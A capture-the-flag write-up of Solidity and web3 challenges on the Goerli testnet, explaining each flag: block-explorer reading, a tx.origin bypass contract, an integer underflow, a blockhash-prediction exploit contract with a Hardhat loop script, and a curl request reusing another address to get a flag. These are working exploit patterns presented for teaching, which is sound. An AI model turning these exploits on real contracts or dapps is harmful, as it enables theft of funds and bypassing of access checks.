The challenges' difficulties ranged from basic to medium. I wasn't intending to release the 2 last challenges but I had to give something for the advanced players.\n\n\n## 3xplorer\n\n![3xplorer](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/explorer_xsz6vl.png)\n\n1. Visit https://goerli.etherscan.io/\n2. Put the contract's address\n3. > Contract section > Read contract\n4. Get the flag `securinets{3xpl0r3_7h3_l4nd5_4nd_f1nd_7h3_37h3r5}`\n\n### #1 Lesson learned\n\nI know how to get informations about a contract by using a block explorer.\n\n## S0lx\n\n![S0lx](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924217/Friendly-ctf/solx_bomnck.png)\n\n1. Read the solidity file\n\n   ```js\n       string public immutable X=\"COntr4cts_\";\n       function answer() public returns (string memory) {\n           S = \"S0l1dItY_\";\n           O = \"securinets{\";\n           L = \"ARe_4w3s0m3}\";\n           return string(abi.encodePacked(O,S, X, L));\n   ```\n\n2. We are concatenating a string here using `abi.encodePacked` (encoding bytes basically and packing them together ~ low level string concatination)\n3. Get the letters content in the right order -> `securinets{S0l1dItY_COntr4cts_ARe_4w3s0m3}`\n\n### #2 Lesson learned\n\nSolidity is a cool language, but it has its own way of doing things.\n\n---\n\n## Int3r4ct\n\n![Int3r4ct](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924218/Friendly-ctf/int3ra4ct_holqse.png)\n\n1.

Open the developer's console `CTRL+SHIT+I`\n3. Logs indicate that `web3js` and `InteractContract` are injected into the console.\n4. Now seeing the docs of `web3js` library we see that to call a contract we have to do `contractInstance.methods.methodName().call()` and it returns a promise\n   [Web3js Docs Reference](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-contract.html#methods-mymethod-call)\n5. Execute it, we should add `await` because it returns a promise. `await InteractContract.methods.FLAG().call()`\n6.

Send ethers to the robot and get the flag `securinets{p0intless_g3n3ros1tY}`\n\n### #4 Lesson learned\n\nSending money in the blockchain is so easy. But that what makes it a source of danger.\n\n---\n\n## No Man's Land\n\n![No Man's Land](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924234/Friendly-ctf/No-man-land_edtogs.png)\n\n```js\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract NoManLand {\n    mapping(address => bool) flagHolders;\n\n    event WonFlag(address indexed);\n\n    function sendFlag() public returns (bool) {\n        require(\n            tx.origin != msg.sender,\n            \"Hey you are not getting the point here\"\n        );\n        flagHolders[tx.origin] = true;\n        emit WonFlag(tx.origin);\n        return true;\n    }\n\n    function canGetFlag(address playerAddress) public view returns (bool) {\n\n        return flagHolders[playerAddress];\n    }\n}\n```\n\n1. We can notice the `require()`, it reverts the transaction when `tx.origin!=msg.sender`\n\nSo let's understand what's `tx.origin` and `msg.sender`:\n\n- `tx.origin` is the address that started the transactions.( Called a function of a contract which calls the function from another contract client -> contract -> contract falls all under one transaction. The client here is the `tx.origin`.\n- `msg.sender` is the direct address of the one that is calling the function. So if we got contract1 -> contract2 -> contract3 where `->` is a function call. The contract3 will have as `msg.sender` value the address of the contract2 and `contract2` will have as `msg.sender` value the address of contract1.\n\n[Consensys Tx.origin](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/)\n\n2. So let's craft a contract that works as an intermediate to calling the `sendFlag` function.\n\n```js\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ninterface NoManLand{\n      function sendFlag() public returns (bool) ;\n}\n\ncontract Solver {\n    NoManLand public victimContract;\n\n\n    constructor(address victimAddress){\n        victimContract=NoManLand(victimAddress);\n    }\n\n    function getFlag() public returns (bool){\n        victimContract.sendFlag();\n        return victimContract.canGetFlag(tx.origin);\n    }\n}\n```\n\nWe can use [Remix IDE](https://remix.ethereum.org/), to deploy the contract. 4. We execute the `getFlag` 3. After the transaction succeeds,We go to the website and verify.\n`securinets{F4ck_Hnm4ns_Sm4rt_C0n5racts_R0kx}`\n\n### #5 Lesson learned\n\n- `tx.origin` is a bad way to identify the other party.\n\n---\n\n## EndGame\n\n![End game](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/endgame_cfigxc.png)\n\n1. Reading the logic of the contract we find one interesting function:\n\n```js\n    function climbLeaderboard(uint256 tryhardCoeff, address realPlayerAddress)\n            public\n        {\n            // If you have a flag why do you have to call it again (just to not add useless events. I need to keep track of solves )\n            require(!flagHolders[msg.sender]);\n            require(players[realPlayerAddress], \"You are not a player\");\n            require(\n                playersHealth[realPlayerAddress] - 100 * tryhardCoeff > 0,\n                \"Player is dead\"\n            );\n\n            playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;\n            playersPoints[realPlayerAddress] += 100;\n\n            if (playersPoints[realPlayerAddress] > 1000) {\n                emit WonFlag(tx.origin);\n                flagHolders[msg.sender]=true;\n            }\n        }\n```\n\n2. If we follow the contract's logic. We will lose the game certainly as our health will deplete faster than the points we gain. Okay so we have `playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;`. It's subtracting a positive value from `uint` and has a coefficient that we control. That makes it vulnerable both logically by throwing zero to it and for the expert eyes to underflow. That means when when the result value of the operation <0, it will underflow to take the maximum value which is in our case 2^265. A good article to better understand what I am talking about [Underflow and overflow article](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow). I didn't want to force a solution as most are beginners and not familiar with the solidity language ^^.\n3. Okay so we have just to pass a value for the coefficient that is `>=11` to cause the underflow then we spam the `climbLeaderboard` till we get an error.\n4. Here is a smart contract to do it.\n\n> PS: The vulnerability is patched since the 0.5.0 [Github issue](https://github.com/ethereum/solidity/issues/796) > `securinets{0d0m3t3r_4r3_Th3_G0ds_0f_0verfl000w}`\n\n### #7 Lesson learned\n\nSolidity is not the perfect language.\n\n---\n\n## Crazy Gambler\n\n![Crazy gambler](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924214/Friendly-ctf/crazy-gambler_hxbelt.png)\n\nThis task is really a challenging one. I was hesitant at first for adding it as I had simpler ones. It's the only task that forces you to write a script in web3 library. However I was surprised when a participant told me he did manually ! That's a lot of perseverance and dedication, It's truly amazing.\n\n1. Read the contract\n\n```js\n function _rollDice() internal view returns (uint256) {\n        uint256 blockNo = block.number - 1;\n        uint256 diceRes = uint256(blockhash(blockNo)) % 3;\n        return diceRes;\n    }\n\n    function trialCredit() public {\n        require(!gotTrial[msg.sender], \"You already got your trial credits\");\n        gamblersCredit[msg.sender] += 7;\n    }\n\n    function gamble(address ownerAddress) public {\n        // Fuck off, No need to emit event again.\n        require(!flagHolders[ownerAddress]);\n        uint256 roll = _rollDice();\n\n        if (roll == 0) {\n            gamblersCredit[msg.sender] += 1;\n        } else {\n            gamblersCredit[msg.sender] = 0;\n        }\n\n        // We get flag when we reach 20 !\n        if (gamblersCredit[msg.sender] ==20) {\n            flagHolders[ownerAddress] = true;\n\n            // Good bye gambler :)\n            gamblersCredit[msg.sender] = 0;\n            emit WonFlag(ownerAddress);\n        }\n    }\n```\n\nSo we are trying to mimicate randomness by using the `block number`. Okay so if you don't what are blocks in the blockchain. I really recommend [Jargon Reference](https://www.upgrad.com/blog/blockchain-architecture/). Why I said mimicate ? Well, because block number is something anyone has access to. So predicting the value is really easy.\n\nLet's craft an evil contract that will implement `_rollDice` and call the gamble if we get the `0` value.\n\n> I copied and pasted the CrazyGambler contract's code from the etherscan interface.\n\nOne other interesting thing:\n\n```js\nfunction trialCredit() public {\n        require(!gotTrial[msg.sender], \"You already got your trial credits\");\n        gamblersCredit[msg.sender] += 7;\n    }\n\n```\n\nHere I am doing the check if the user got a trial or not but I am not modifying that value anywhere. So the user can get infinite `trialCredit`.\nWe can use that to get close to our target value of credits which is `20`.\nAlso, it allows the player to reuse its address.\n\nLet's craft our evil contract then..\n\n```js\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\nimport \"./CrazyGambler.sol\";\n\ncontract ExploitContract {\n    CrazyGambler crazyGambler;\n\n    constructor(address victimAddress) {\n        // Setting our target\n        crazyGambler = CrazyGambler(victimAddress);\n    }\n\n    event Gamble(uint256);\n\n    // Using the same function\n    function _rollDice() internal view returns (uint256) {\n\n        uint256 blockNo = block.number - 1;\n        uint256 diceRes = uint256(blockhash(blockNo)) % 3;\n        return diceRes;\n    }\n\n    //\n    function initThing() public {\n        crazyGambler.trialCredit();\n        crazyGambler.trialCredit();\n    }\n\n    function tryToSolve() public  {\n        uint256 res = _rollDice();\n        // The same check as in gamble\n        if (res == 0) {\n            crazyGambler.gamble(msg.sender);\n        }\n        // Here to keep track of our progress\n        uint256 currentCredit = crazyGambler.gamblersCredit(address(this));\n        // Emitting an event is like announcing something. It's really good\n        // to inform off-chain parties of on-chain updates\n        emit Gamble(currentCredit);\n    }\n}\n```\n\nI used both `hardhat` and `foundry` for scripting the exploit. We need to call the function tryToSolve till we get to 20.\n, but I will share the `hardhat` one because it's easier to understand as it's javascript code. ( well I write in Typescript. Can't live without type safety )\n\n```js\nimport { ethers, getNamedAccounts } from \"hardhat\";\nimport { CrazyGambler, ExploitContract } from \"../typechain-types\";\n\nlet crazyGambler: CrazyGambler;\nlet exploitContract: ExploitContract;\nlet deployer: string;\n\n\nconst setUp = async () => {\n    // Getting my private key\n    deployer = (await getNamedAccounts()).deployer;\n\n    // Getting the crazy gambler's address\n    const crazyGamblerAddress = \"0x55409Be51f453acCDbab41c439545FA317C0508b\"\n\n    // Uncomment to use for deploy a contract and start the exploit\n    crazyGambler = await ethers.getContractAt(\"CrazyGambler\", crazyGamblerAddress);\n    // Deploying my exploit contract\n    const exploitContractFactory = await ethers.getContractFactory(\"ExploitContract\");\n    const tx = await exploitContractFactory.deploy(crazyGamblerAddress)\n    exploitContract = await tx.deployed();\n\n    //  Comment that to reuse the contract, (might crash because a transaction fail or hit the rate limit on the Infura Node )\n    // exploitContract = await ethers.getContractAt(\"ExploitContract\", \"0x2CAa717BaA85A0B5B39798bDB9121243D84Fe2E3\");\n    console.log('deployed exploit contract', exploitContract.address)\n\n}\n\n\nconst solve = async () => {\n    let solved = false;\n\n    // Uncomment that when you are using the contract for the first time\n    await (await exploitContract.initThing({ gasLimit: 300000 })).wait(1)\n\n    // Keeping track of the balance\n    let currentBalance = (await crazyGambler.gamblersCredit(exploitContract.address)).toNumber();\n\n    console.log('current balance', currentBalance)\n\n    while (!solved) {\n        try {\n            const res = await (await exploitContract.tryToSolve({ gasLimit: 300000 })).wait()\n            console.log((res as any)?.events[0]?.args[0].toNumber())\n        }\n        catch (error: any) {\n            console.log(error.message)\n\n        }\n\n        // Updating balance\n        currentBalance = (await crazyGambler.gamblersCredit(deployer)).toNumber();\n        console.log('current balance', currentBalance)\n        // So the script don't overrun\n        if (currentBalance >= 20) break;\n\n\n        // Algorithm foo\n        solved = await crazyGambler.canGetFlag(deployer, { gasLimit: 30000 });\n        console.log(\"Yes it's solved\")\n\n    }\n}\n\nasync function main() {\n    await setUp();\n    await solve();\n}\n\nmain().then(() => console.log('finished')).catch(error => {\n    console.log(error)\n})\n\n```\n\n`securinets{G4mbl1ng_Th3_Bl0ck_1s_A_MyTh}`\n\n> Kudos to one participant, who did execute the script manually. It's really hard to do so. 30% chance to get a good hash ( Not really but we can say so) and with\n> a block time of 15 seconds. The script should run for some time. Mine did solve it in 30 minute while. I know it's not the best way to present such a task. But that's the closest to how hacks happen on the mainnet. They needs patience.\n\n![Picture of participant conversation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664925884/Friendly-ctf/odd_elq1gd.png)\n\n### Lesson Learned\n\n- Randomness is impossible to perform in the blockchain world without the help of off-chain solutions. Oracles are made for that. But wait how trustful are they ?\n\n---\n\n## There is more than the eye can see\n\n### Greedy Robot: the mean solution `mean for the robot ofc :)`\n\nOkay so here is the trick, there are two intended solutions to this task each one gives different insight.\n\nMost people stopped the enumeration and went to search how they can send ethers on the blockchain even that the price is high ( half what the alchemy - most generous faucet) gives you.\n\nThat's the basic challenge, but I wanted to raise the concern that in the dapps world there is huge immaturity from the developers in their approach of integrating blockchain with old technologies ( web tech in this situation ). If you check the contract's source code by using the `etherscan`.\n\n```js\nfunction canPass(address contributorAddress) public view returns (bool) {\n        return contributors[contributorAddress] >= MINIMUM_CONTRIBUTION;\n    }\n```\n\nOkay so it's passing the address and checking if it has sent ethers or not. Seeing the client of the dapp, It's sending the address\n\n![Request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/vulnerable-request_cdtawm.png)\n\nSo, the server is actually checking if the user sent the ethers or not by calling the canPass from the contract. Wait, there is no mechanism to ensure that it's the same user who sent the ethers is using the dapp right now.\n\nI even sent ethers myself to the contract so anyone can grab my address and send it to the api to get the flag :)\n\n![Other](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/greedy-robots-tx-logs_mnv9z5.png)\n\n```bash\ncurl  https://greedy-robots.ctf.securinets.tn/api/flag --json '{{\"address\":\"0x84e7a3679A82C2766Ff8382862ab883FF9460307\"}}\n```\n\n![Evil R0b0t](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/evil-robot_ic0ajq.png)\n\nNow you get the challenge name `securinets{p0intless_g3n3ros1tY}`\n\n### #8 Lesson learned\n\nThe weakest link in blockchain is its integration with current technologies.
